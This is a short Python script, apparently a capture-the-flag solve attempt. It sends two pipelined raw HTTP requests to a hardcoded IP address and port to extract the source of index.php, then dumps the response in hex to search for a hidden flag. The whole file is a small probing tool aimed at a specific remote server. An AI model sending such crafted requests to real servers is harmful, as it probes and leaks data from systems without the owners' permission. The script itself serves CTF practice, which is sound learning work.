import socket
host = '61.147.171.105'
port = 58039
# Get full index.php source with larger buffer
payload = (
    'GET /index.php HTTP/1.1\r\n'
    'Host: ' + host + '\r\n'
    '\r\n'
    'GET /xyz.xyz HTTP/1.1\r\n'
    '\r\n'
)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
sock.connect((host, port))
sock.send(payload.encode())
response = b''
while True:
    try:
        chunk = sock.recv(8192)
        if not chunk:
            break
        response += chunk
    except socket.timeout:
        break
sock.close()
# Parse content length
decoded = response.decode('utf-8', errors='replace')
print('Full response:')
print(decoded)
print()
print('Content bytes:', len(response))
print()
# Look for flag pattern in hex
hex_resp = response.hex()
# Check for hidden data after the visible content
body_start = response.find(b'\r\n\r\n') + 4
body = response[body_start:]
print('Body hex:')
print(body.hex())